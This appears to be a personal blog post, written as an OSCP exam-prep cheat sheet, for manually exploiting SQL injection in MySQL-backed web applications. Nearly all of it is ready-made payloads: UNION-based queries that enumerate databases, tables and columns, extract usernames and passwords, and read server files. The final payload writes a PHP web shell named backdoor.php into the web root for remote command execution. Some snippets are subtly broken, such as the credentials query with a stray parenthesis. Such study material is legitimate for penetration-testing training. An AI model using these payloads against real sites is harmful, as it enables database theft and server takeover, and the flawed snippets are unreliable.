---
layout: single
title:  "OSCP Prep - SQL Injection Cheat Sheet"
date:   2020-09-23
excerpt: "My cheat sheet for manually discovering and exploiting SQL injection vulnerabilities."
categories:
  - oscp prep
  - infosec
tags:
  - sql injection
---

### Before you start

* Make sure to tell the differnence between numeric and string-based SQL Injection!
* Try both `'`, `"` quotes for string prefixes for string based injection.
* Try both `--` and `#` for suffixes in all injections. 
* Do simple subtraction for numeric based injection.

### Count enumerable columns

```mysql
' ORDER BY 1;-- 
```

### Render data from the database onto the webpage

```mysql
' UNION ALL SELECT 1,2;-- 
```

### List all databases

The techniques below demonstrates how to smuggle multiple returned fields into
a single row since the application may limit the amount of rows rendered. This
technique is also limited to 1024 characters, so be aware of that.

```mysql
' UNION ALL SELECT (SELECT GROUP_CONCAT(schema_name SEPARATOR ', ') from information_schema.schemata),2;-- 
```

### List all tables for a particular database

```mysql
' UNION ALL SELECT (SELECT GROUP_CONCAT(table_name SEPARATOR ', ') from information_schema.columns where table_schema = 'somedatabase'),2;-- 
```

### Get columns for a particular table

```mysql
' UNION ALL SELECT (SELECT GROUP_CONCAT(column_name SEPARATOR ', ') from information_schema.columns where table_schema = 'somedatabase' and table_name = 'sometable'),2;-- 
```

### Get username and password in a single row

```mysql
' UNION ALL SELECT CONCAT(col1,';',col2) from sometable.somecolumn),NULL;-- 
```

### Check if you can read a file

TIP: If you cannot find the web root, then you can try to write to a web root
that you think exists and write a PHP info file to get more information about
the web server. On Apache, sometimes the default PHP file can be phpinfo.php
under the web root.

Common web roots are /var/www and /var/www html.

```mysql
' UNION ALL SELECT LOAD_FILE('/var/www/html/index.html'),NULL;--
```

### Write to a file

This will only work when the database
and webserver are on the same host and the database has permission to write to
the web root!

```mysql
' UNION ALL SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/opt/lampp/htdocs/backdoor.php";--
' UNION ALL SELECT (SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/opt/lampp/htdocs/backdoor.php"),NULL;--
```
